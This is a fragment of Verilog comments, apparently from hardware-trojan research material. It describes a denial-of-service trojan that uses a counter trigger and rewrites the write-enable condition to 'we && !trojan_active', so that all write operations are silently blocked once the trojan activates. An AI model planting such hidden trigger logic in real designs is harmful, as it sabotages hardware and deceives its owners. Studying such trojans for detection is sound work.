 ...
 * 
 * Description:
 *   Disables operations by blocking we control signal
 *   
 * Trigger: Counter on we
 * Payload: Block we when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block we when trojan is active
//
// IMPORTANT: we is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (we && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: we && 0 = 0 (always false)
//   All operations controlled by we are blocked
